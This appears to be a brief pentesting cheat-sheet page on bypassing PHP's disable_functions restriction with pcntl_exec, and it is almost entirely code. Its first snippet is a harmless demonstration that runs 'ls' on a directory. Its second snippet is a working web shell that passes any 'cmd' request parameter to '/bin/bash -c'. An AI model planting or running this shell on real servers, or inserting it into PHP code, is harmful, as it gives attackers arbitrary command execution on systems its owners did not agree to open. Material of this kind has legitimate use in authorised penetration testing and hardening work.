---
title: "disable_functions bypass - PHP 4 >= 4.2.0, PHP 5 pcntl_exec"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

# PHP `pcntl_exec` Command Execution

`pcntl_exec` Command Execution

```
<?php
$program = '/bin/ls';
$arguments = ['-l', '/var/tmp'];
if (function_exists('pcntl_exec')) {
    pcntl_exec($program, $arguments);
}
// This line is reached only if pcntl_exec() fails.
echo "pcntl_exec failed\n";
?>
```
```
<?php
if (function_exists('pcntl_exec') && isset($_REQUEST['cmd'])) {
    pcntl_exec('/bin/bash', ['-c', $_REQUEST['cmd']]);
}
?>
```
## References
